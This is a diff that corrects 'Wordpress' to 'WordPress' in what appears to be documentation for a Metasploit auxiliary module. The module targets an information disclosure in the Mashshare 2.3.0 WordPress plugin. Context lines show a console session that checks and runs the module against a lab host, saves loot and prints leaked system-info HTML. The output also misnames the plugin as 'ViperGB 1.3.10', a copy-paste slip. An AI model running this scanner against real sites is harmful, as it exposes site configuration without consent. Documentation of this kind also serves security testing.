@@ -1,6 +1,6 @@
-#### Add Wordpress Plugin Mashshare Information Disclosure Vulnerability.
+#### Add WordPress Plugin Mashshare Information Disclosure Vulnerability.
 
-  Application: Wordpress Plugin 'Mashshare' 2.3.0
+  Application: WordPress Plugin 'Mashshare' 2.3.0
   Homepage: https://wordpress.org/plugins/mashshare/
   Source Code: https://downloads.wordpress.org/plugin/mashsharer.2.3.0.zip
   Active Installs: 20,000+
@@ -39,7 +39,7 @@ Basic options:
 
 Description:
   This module attempts to exploit a information disclosure in 
-  Mashshare for Wordpress, version 2.3.0 and likely prior in order if 
+  Mashshare for WordPress, version 2.3.0 and likely prior in order if 
   the instance is vulnerable.
 
 References:
@@ -67,7 +67,7 @@ msf auxiliary(wp_mashshare_info_disclosure) > check
 [*] Checked 1 of 1 hosts (100% complete)
 msf auxiliary(wp_mashshare_info_disclosure) > run
 
-[+] 192.168.1.38:80 - Vulnerable to Information Disclosure the "ViperGB 1.3.10" plugin for Wordpress
+[+] 192.168.1.38:80 - Vulnerable to Information Disclosure the "ViperGB 1.3.10" plugin for WordPress
 [+] Save in: /home/espreto/.msf4/loot/20150513005815_default_192.168.1.38_wp_mashshare_018552.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
@@ -75,7 +75,7 @@ msf auxiliary(wp_mashshare_info_disclosure) > set VERBOSE true
 VERBOSE => true
 msf auxiliary(wp_mashshare_info_disclosure) > run
 
-[+] 192.168.1.38:80 - Vulnerable to Information Disclosure the "ViperGB 1.3.10" plugin for Wordpress
+[+] 192.168.1.38:80 - Vulnerable to Information Disclosure the "ViperGB 1.3.10" plugin for WordPress
 [+] Information Disclosure:   <form action="http://127.0.0.1/wp-admin/admin.php?page=mashsb-tools&#038;tab=system_info" method="post" dir="ltr">
     <textarea readonly="readonly" onclick="this.focus(); this.select()" id="system-info-textarea" name="mashsb-sysinfo" title="To copy the system info, click below then press Ctrl + C (PC) or Cmd + C (Mac).">### Begin System Info ###
 
